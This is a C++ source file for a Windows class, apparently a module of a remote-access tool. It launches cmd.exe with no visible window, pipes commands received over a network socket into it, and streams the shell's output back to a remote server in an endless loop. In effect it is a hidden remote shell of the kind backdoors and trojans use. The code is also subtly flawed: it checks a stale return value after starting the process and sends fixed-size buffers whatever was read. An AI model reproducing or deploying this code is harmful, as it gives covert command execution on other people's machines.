
#include "Cmd.h"
Cmd::Cmd()
{
}


Cmd::~Cmd()
{
}

void Cmd::RecvCommnd(char* szbuf,int nLenth)
{
    //char szbuf[256] = { 0 };
    DWORD dwWriten = 0; 
    WriteFile(hMyWrite, szbuf, nLenth, &dwWriten, NULL);
}

void Cmd::Send()
{
    char szbuf[4096] = { 0 };
    DWORD dw = 0;
    DWORD dwRead = 0;
    DWORD lpBytesRead;            // number of bytes read
    DWORD lpTotalBytesAvail;      // number of bytes available
    DWORD lpBytesLeftThisMessage;
    while (1)
    {


        memset(szbuf, 0, 4096);
        //PeekNamedPipe(hMyRead, szbuf, 4096, &dwReadSize, 0, 0);
        PeekNamedPipe(hMyRead, szbuf, 4095, &lpBytesRead, &lpTotalBytesAvail, &lpBytesLeftThisMessage);
        if (lpTotalBytesAvail > 0)
        {
            ReadFile(hMyRead, szbuf, 4096, &dwRead, NULL);
     
            bool b = SendData(m_Sever, SEND_CMD, szbuf, 4096);
             if (!b)
               {
               break;
               }
        }

    }

}

void Cmd::CreateCmd(SOCKET s)
{
   
    m_Sever = s;

    SECURITY_ATTRIBUTES sa = { 0 };
    sa.bInheritHandle = TRUE;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = NULL;

    BOOL bRet = CreatePipe(&hCmdRead, &hMyWrite, &sa, 0);
    if (!bRet)
    {
        return;
    }
    bRet = CreatePipe(&hMyRead, &hCmdWrite, &sa, 0);
    if (!bRet)
    {
        return;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi;

    si.cb = sizeof(STARTUPINFOA);

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hCmdWrite;
    si.hStdError = hCmdWrite;
    si.hStdInput = hCmdRead;

    char szbuf[] = "cmd.exe";
    CreateProcessA(NULL, szbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (bRet == 0)
    {
        return;
    }
  std::thread t(std::bind(&Cmd::Send, this));
  t.detach();
}